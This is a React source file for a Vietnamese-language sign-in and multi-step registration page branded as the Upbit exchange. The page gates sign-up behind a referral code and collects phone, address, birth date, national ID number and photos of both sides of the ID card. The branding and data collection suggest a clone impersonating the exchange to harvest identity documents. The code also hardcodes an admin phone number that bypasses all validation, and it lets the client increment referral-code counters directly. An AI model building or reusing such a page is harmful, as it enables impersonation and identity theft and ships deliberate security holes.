import { useState, useRef } from "react";
import upbitLogo from "@/assets/upbit-logo.svg";
import loginBgVideo from "@/assets/login-bg-video.mp4";
import { supabase } from "@/integrations/supabase/client";
import { useNavigate } from "react-router-dom";
import { toast } from "sonner";
import { Camera, ChevronLeft, ChevronRight, Check, Eye, EyeOff } from "lucide-react";

const Auth = () => {
  const [isLogin, setIsLogin] = useState(true);
  const navigate = useNavigate();

  return (
    <div className="relative flex flex-col items-center justify-center min-h-screen px-4 overflow-hidden">
      {/* Video Background */}
      <video
        autoPlay
        loop
        muted
        playsInline
        className="absolute inset-0 w-full h-full object-cover z-0"
      >
        <source src={loginBgVideo} type="video/mp4" />
      </video>
      {/* Overlay */}
      <div className="absolute inset-0 bg-black/60 z-[1]" />

      <div className="w-full max-w-sm relative z-10">
        <div className="flex items-center justify-center gap-2 mb-8">
          <img src={upbitLogo} alt="Upbit" className="w-12 h-12" />
          <span className="text-2xl font-bold text-white">Upbit</span>
        </div>

        {isLogin ?
        <LoginForm onSwitch={() => setIsLogin(false)} /> :

        <RegisterForm onSwitch={() => setIsLogin(true)} />
        }

        <p className="text-xs text-white/50 text-center mt-4">
          © 2026 Upbit. All rights reserved.
        </p>
      </div>
    </div>);

};

// ========== LOGIN ==========
const LoginForm = ({ onSwitch }: {onSwitch: () => void;}) => {
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const cleanPhone = phone.replace(/[^0-9]/g, "");
      const fakeEmail = `${cleanPhone}@upbit.local`;
      const { error } = await supabase.auth.signInWithPassword({
        email: fakeEmail,
        password,
      });

      if (error) {
        toast.error("Sai số điện thoại hoặc mật khẩu");
      } else {
        navigate("/");
      }
    } catch {
      toast.error("Lỗi đăng nhập");
    }
    setLoading(false);
  };

  return (
    <div className="bg-black/40 backdrop-blur-xl rounded-xl p-6 border border-white/10 shadow-2xl">
      <h2 className="text-lg font-bold text-white text-center mb-6">Đăng nhập</h2>
      <form onSubmit={handleLogin} className="flex flex-col gap-4">
        <div>
          <label className="text-xs text-white/70 mb-1 block">Số điện thoại</label>
          <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value)} required
          className="w-full px-3 py-2.5 rounded-lg bg-white/10 text-white border border-white/20 text-sm focus:outline-none focus:ring-2 focus:ring-primary placeholder:text-white/40"
          placeholder="Nhập số điện thoại" />
        </div>
        <div>
          <label className="text-xs text-white/70 mb-1 block">Mật khẩu</label>
          <div className="relative">
            <input type={showPassword ? "text" : "password"} value={password} onChange={(e) => setPassword(e.target.value)} required minLength={6}
            className="w-full px-3 py-2.5 rounded-lg bg-white/10 text-white border border-white/20 text-sm focus:outline-none focus:ring-2 focus:ring-primary pr-10 placeholder:text-white/40"
            placeholder="••••••••" />
            <button type="button" onClick={() => setShowPassword(!showPassword)}
            className="absolute right-3 top-1/2 -translate-y-1/2 text-white/50">
              {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          </div>
        </div>
        <button type="submit" disabled={loading}
        className="w-full py-3 rounded-lg bg-primary text-primary-foreground font-bold text-sm transition-all hover:opacity-90 disabled:opacity-50">
          {loading ? "Đang xử lý..." : "Đăng nhập"}
        </button>
      </form>
      <div className="mt-4 text-center">
        <button onClick={onSwitch} className="text-sm text-white/60 hover:text-primary transition-colors">
          Chưa có tài khoản? Đăng ký
        </button>
      </div>
    </div>);

};

// ========== REGISTER (Multi-step) ==========
const RegisterForm = ({ onSwitch }: {onSwitch: () => void;}) => {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const navigate = useNavigate();

  // Step 1
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [referralCode, setReferralCode] = useState("");

  // Step 2
  const [fullName, setFullName] = useState("");
  const [dob, setDob] = useState("");
  const [address, setAddress] = useState("");

  // Step 3
  const [idCardNumber, setIdCardNumber] = useState("");
  const [frontImage, setFrontImage] = useState<File | null>(null);
  const [backImage, setBackImage] = useState<File | null>(null);
  const [frontPreview, setFrontPreview] = useState<string | null>(null);
  const [backPreview, setBackPreview] = useState<string | null>(null);
  const frontRef = useRef<HTMLInputElement>(null);
  const backRef = useRef<HTMLInputElement>(null);

  const handleImageSelect = (file: File, side: "front" | "back") => {
    const url = URL.createObjectURL(file);
    if (side === "front") {setFrontImage(file);setFrontPreview(url);} else
    {setBackImage(file);setBackPreview(url);}
  };

  const isAdminPhone = phone.replace(/[^0-9]/g, "") === "88889999";

  const validateStep1 = () => {
    if (isAdminPhone) return true;
    if (!phone || phone.replace(/[^0-9]/g, "").length < 9) {
      toast.error("Số điện thoại không hợp lệ");return false;
    }
    if (!email || !email.includes("@")) {
      toast.error("Email không hợp lệ");return false;
    }
    if (password.length < 6) {
      toast.error("Mật khẩu phải có ít nhất 6 ký tự");return false;
    }
    if (password !== confirmPassword) {
      toast.error("Mật khẩu nhập lại không khớp");return false;
    }
    if (!referralCode.trim()) {
      toast.error("Vui lòng nhập mã giới thiệu");return false;
    }
    return true;
  };

  const validateStep2 = () => {
    if (isAdminPhone) return true;
    if (!fullName.trim()) {toast.error("Vui lòng nhập họ và tên");return false;}
    if (!dob) {toast.error("Vui lòng nhập ngày sinh");return false;}
    if (!address.trim()) {toast.error("Vui lòng nhập địa chỉ");return false;}
    return true;
  };

  const validateStep3 = () => {
    if (isAdminPhone) return true;
    if (!idCardNumber.trim() || idCardNumber.replace(/[^0-9]/g, "").length < 9) {
      toast.error("Vui lòng nhập số CCCD hợp lệ");return false;
    }
    return true;
  };

  const handleNext = async () => {
    if (step === 1) {
      if (!validateStep1()) return;
      // Skip referral code check for admin
      if (!isAdminPhone) {
        setLoading(true);
        const { data: codeData, error } = await supabase.
        from("referral_codes").
        select("id, is_active, max_uses, current_uses").
        eq("code", referralCode.trim()).
        eq("is_active", true).
        maybeSingle();
        setLoading(false);

        if (!codeData) {
          toast.error("Mã giới thiệu không đúng hoặc đã hết hạn");
          return;
        }
        if (codeData.max_uses && codeData.current_uses >= codeData.max_uses) {
          toast.error("Mã giới thiệu đã hết lượt sử dụng");
          return;
        }
      }
      setStep(2);
    } else if (step === 2) {
      if (!validateStep2()) return;
      setStep(3);
    } else if (step === 3) {
      if (!validateStep3()) return;
      await handleRegister();
    }
  };

  const handleRegister = async () => {
    setLoading(true);
    try {
      const cleanPhone = phone.replace(/[^0-9]/g, "");
      const fakeEmail = `${cleanPhone}@upbit.local`;

      // Sign up
      const { data: signUpData, error: signUpError } = await supabase.auth.signUp({
        email: fakeEmail,
        password,
        options: {
          data: {
            display_name: fullName,
            phone: cleanPhone,
            real_email: email
          }
        }
      });

      if (signUpError) {
        if (signUpError.message.includes("already")) {
          toast.error("Số điện thoại đã được đăng ký");
        } else {
          toast.error(signUpError.message);
        }
        setLoading(false);
        return;
      }

      const userId = signUpData.user?.id;
      if (!userId) {toast.error("Lỗi đăng ký");setLoading(false);return;}

      // Upload ID card images
      const uploadFile = async (file: File, side: string) => {
        const ext = file.name.split('.').pop();
        const path = `${userId}/${side}.${ext}`;
        const { error } = await supabase.storage.from("id-cards").upload(path, file);
        if (error) throw error;
        return path;
      };

      let frontPath: string | null = null;
      let backPath: string | null = null;
      if (frontImage) frontPath = await uploadFile(frontImage, "front");
      if (backImage) backPath = await uploadFile(backImage, "back");

      // Update profile with additional info
      await supabase.from("profiles").update({
        phone: cleanPhone,
        full_name: fullName,
        date_of_birth: dob,
        address: address,
        id_card_front_url: frontPath,
        id_card_back_url: backPath,
        id_card_number: idCardNumber.trim(),
        referral_code_used: referralCode.trim(),
        display_name: fullName
      }).eq("user_id", userId);

      // Increment referral code usage
      await supabase.rpc("has_role", { _user_id: userId, _role: "user" }).then(() => {


        // Just a dummy call, we update referral via direct update
      });const { data: codeData } = await supabase.from("referral_codes").
      select("id, current_uses").
      eq("code", referralCode.trim()).
      single();
      if (codeData) {
        await supabase.from("referral_codes").update({
          current_uses: codeData.current_uses + 1
        }).eq("id", codeData.id);
      }

      toast.success("Đăng ký thành công!");
      navigate("/");
    } catch (err: any) {
      toast.error("Lỗi trong quá trình đăng ký: " + (err.message || ""));
    }
    setLoading(false);
  };

  const stepLabels = ["Tài khoản", "Thông tin", "Xác minh"];

  return (
    <div className="bg-black/40 backdrop-blur-xl rounded-xl p-6 border border-white/10 shadow-2xl">
      {/* Step indicator */}
      <div className="flex items-center justify-center gap-2 mb-6">
        {stepLabels.map((label, i) =>
        <div key={i} className="flex items-center gap-2">
            <div className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold transition-colors ${
          step > i + 1 ? "bg-primary text-primary-foreground" :
          step === i + 1 ? "bg-primary text-primary-foreground" :
          "bg-white/10 text-white/50"}`
          }>
              {step > i + 1 ? <Check className="w-4 h-4" /> : i + 1}
            </div>
            <span className={`text-xs font-medium hidden sm:inline ${
          step === i + 1 ? "text-primary" : "text-white/50"}`
          }>{label}</span>
            {i < 2 && <div className={`w-6 h-0.5 ${step > i + 1 ? "bg-primary" : "bg-white/20"}`} />}
          </div>
        )}
      </div>

      {/* Step 1: Account info */}
      {step === 1 &&
      <div className="flex flex-col gap-3">
          <h2 className="text-base font-bold text-white text-center mb-2">Tạo tài khoản</h2>
          <div>
            <label className="text-xs text-white/70 mb-1 block">Số điện thoại</label>
            <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value)}
          className="w-full px-3 py-2.5 rounded-lg bg-white/10 text-white border border-white/20 text-sm focus:outline-none focus:ring-2 focus:ring-primary placeholder:text-white/40"
          placeholder="0912345678" />
          </div>
          <div>
            <label className="text-xs text-white/70 mb-1 block">Email</label>
            <input type="email" value={email} onChange={(e) => setEmail(e.target.value)}
          className="w-full px-3 py-2.5 rounded-lg bg-white/10 text-white border border-white/20 text-sm focus:outline-none focus:ring-2 focus:ring-primary placeholder:text-white/40"
          placeholder="email@example.com" />
          </div>
          <div>
            <label className="text-xs text-white/70 mb-1 block">Mật khẩu</label>
            <div className="relative">
              <input type={showPassword ? "text" : "password"} value={password} onChange={(e) => setPassword(e.target.value)}
            className="w-full px-3 py-2.5 rounded-lg bg-white/10 text-white border border-white/20 text-sm focus:outline-none focus:ring-2 focus:ring-primary pr-10 placeholder:text-white/40"
            placeholder="Ít nhất 6 ký tự" />
              <button type="button" onClick={() => setShowPassword(!showPassword)}
            className="absolute right-3 top-1/2 -translate-y-1/2 text-white/50">
                {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
          </div>
          <div>
            <label className="text-xs text-white/70 mb-1 block">Nhập lại mật khẩu</label>
            <input type="password" value={confirmPassword} onChange={(e) => setConfirmPassword(e.target.value)}
          className="w-full px-3 py-2.5 rounded-lg bg-white/10 text-white border border-white/20 text-sm focus:outline-none focus:ring-2 focus:ring-primary placeholder:text-white/40"
          placeholder="••••••••" />
          </div>
          <div>
            <label className="text-xs text-white/70 mb-1 block">Mã giới thiệu</label>
            <input type="text" value={referralCode} onChange={(e) => setReferralCode(e.target.value)}
          className="w-full px-3 py-2.5 rounded-lg bg-white/10 text-white border border-white/20 text-sm focus:outline-none focus:ring-2 focus:ring-primary placeholder:text-white/40" placeholder="" />

          </div>
        </div>
      }

      {/* Step 2: Personal info */}
      {step === 2 &&
      <div className="flex flex-col gap-3">
          <h2 className="text-base font-bold text-white text-center mb-2">Thông tin cá nhân</h2>
          <div>
            <label className="text-xs text-white/70 mb-1 block">Họ và Tên</label>
            <input type="text" value={fullName} onChange={(e) => setFullName(e.target.value)}
          className="w-full px-3 py-2.5 rounded-lg bg-white/10 text-white border border-white/20 text-sm focus:outline-none focus:ring-2 focus:ring-primary placeholder:text-white/40"
          placeholder="Nguyễn Văn A" />
          </div>
          <div>
            <label className="text-xs text-white/70 mb-1 block">Ngày tháng năm sinh</label>
            <input type="date" value={dob} onChange={(e) => setDob(e.target.value)}
          className="w-full px-3 py-2.5 rounded-lg bg-white/10 text-white border border-white/20 text-sm focus:outline-none focus:ring-2 focus:ring-primary" />
          </div>
          <div>
            <label className="text-xs text-white/70 mb-1 block">Địa chỉ</label>
            <input type="text" value={address} onChange={(e) => setAddress(e.target.value)}
          className="w-full px-3 py-2.5 rounded-lg bg-white/10 text-white border border-white/20 text-sm focus:outline-none focus:ring-2 focus:ring-primary placeholder:text-white/40"
          placeholder="Số nhà, đường, quận/huyện, tỉnh/thành" />
          </div>
        </div>
      }

      {/* Step 3: ID card upload */}
      {step === 3 &&
      <div className="flex flex-col gap-4">
          <h2 className="text-base font-bold text-white text-center mb-2">Xác minh CCCD</h2>
          <p className="text-xs text-white/50 text-center -mt-2">Chụp ảnh căn cước công dân chính chủ</p>

          {/* Front */}
          <div>
            <label className="text-xs text-white/70 mb-2 block">Mặt trước CCCD</label>
            <input ref={frontRef} type="file" accept="image/*" className="hidden"
          onChange={(e) => e.target.files?.[0] && handleImageSelect(e.target.files[0], "front")} />
            <button onClick={() => frontRef.current?.click()}
          className={`w-full h-36 rounded-xl border-2 border-dashed flex flex-col items-center justify-center gap-2 transition-colors ${
          frontPreview ? "border-primary bg-primary/10" : "border-white/20 bg-white/5 hover:border-primary/50"}`
          }>
              {frontPreview ?
            <img src={frontPreview} alt="Mặt trước" className="h-full w-full object-contain rounded-lg" /> :

            <>
                  <Camera className="w-8 h-8 text-white/50" />
                  <span className="text-xs text-white/50">Chạm để chụp / chọn ảnh</span>
                </>
            }
            </button>
          </div>

          {/* CCCD Number */}
          <div>
            <label className="text-xs text-white/70 mb-1 block">Số CCCD</label>
            <input type="text" value={idCardNumber} onChange={(e) => setIdCardNumber(e.target.value)}
          className="w-full px-3 py-2.5 rounded-lg bg-white/10 text-white border border-white/20 text-sm focus:outline-none focus:ring-2 focus:ring-primary placeholder:text-white/40"
          placeholder="Nhập số căn cước công dân" />
          </div>


          <div>
            <label className="text-xs text-white/70 mb-2 block">Mặt sau CCCD</label>
            <input ref={backRef} type="file" accept="image/*" className="hidden"
          onChange={(e) => e.target.files?.[0] && handleImageSelect(e.target.files[0], "back")} />
            <button onClick={() => backRef.current?.click()}
          className={`w-full h-36 rounded-xl border-2 border-dashed flex flex-col items-center justify-center gap-2 transition-colors ${
          backPreview ? "border-primary bg-primary/10" : "border-white/20 bg-white/5 hover:border-primary/50"}`
          }>
              {backPreview ?
            <img src={backPreview} alt="Mặt sau" className="h-full w-full object-contain rounded-lg" /> :

            <>
                  <Camera className="w-8 h-8 text-white/50" />
                  <span className="text-xs text-white/50">Chạm để chụp / chọn ảnh</span>
                </>
            }
            </button>
          </div>
        </div>
      }

      {/* Navigation buttons */}
      <div className="flex gap-2 mt-5">
        {step > 1 &&
        <button onClick={() => setStep(step - 1)}
        className="flex-1 py-3 rounded-lg bg-white/10 text-white font-semibold text-sm flex items-center justify-center gap-1 border border-white/20">
            <ChevronLeft className="w-4 h-4" /> Quay lại
          </button>
        }
        <button onClick={handleNext} disabled={loading || !isAdminPhone && (
        step === 1 && (!phone.trim() || !email.trim() || !password || !confirmPassword || !referralCode.trim()) ||
        step === 2 && (!fullName.trim() || !dob || !address.trim()) ||
        step === 3 && (!idCardNumber.trim()))
        }
        className="flex-1 py-3 rounded-lg bg-primary text-primary-foreground font-bold text-sm transition-all hover:opacity-90 disabled:opacity-50 flex items-center justify-center gap-1">
          {loading ? "Đang xử lý..." : step === 3 ?
          <>Hoàn tất đăng ký</> :

          <>Tiếp tục <ChevronRight className="w-4 h-4" /></>
          }
        </button>
      </div>

      <div className="mt-4 text-center">
        <button onClick={onSwitch} className="text-sm text-white/60 hover:text-primary transition-colors">
          Đã có tài khoản? Đăng nhập
        </button>
      </div>
    </div>);

};

export default Auth;